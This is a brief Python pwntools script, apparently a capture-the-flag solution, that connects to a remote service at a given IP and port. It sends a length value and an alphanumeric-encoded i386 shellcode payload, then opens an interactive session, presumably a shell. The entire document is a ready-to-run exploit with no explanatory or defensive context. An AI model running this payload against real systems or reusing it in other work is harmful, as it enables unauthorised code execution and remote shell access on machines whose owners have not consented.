from pwn import *

context(arch = "i386", os = "linux", log_level = "Debug")
io = process("./shellcode")
io = remote("119.45.112.147", 20003)
# gdb.attach(io)

# io.recvuntil("shellcode!")
shellcode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJITq9YkGYqX0fkE8toCC3X5PBHVOCRrIPnNiJCXMk0AAGG"     
io.sendline("96")
io.send(shellcode)
io.interactive()
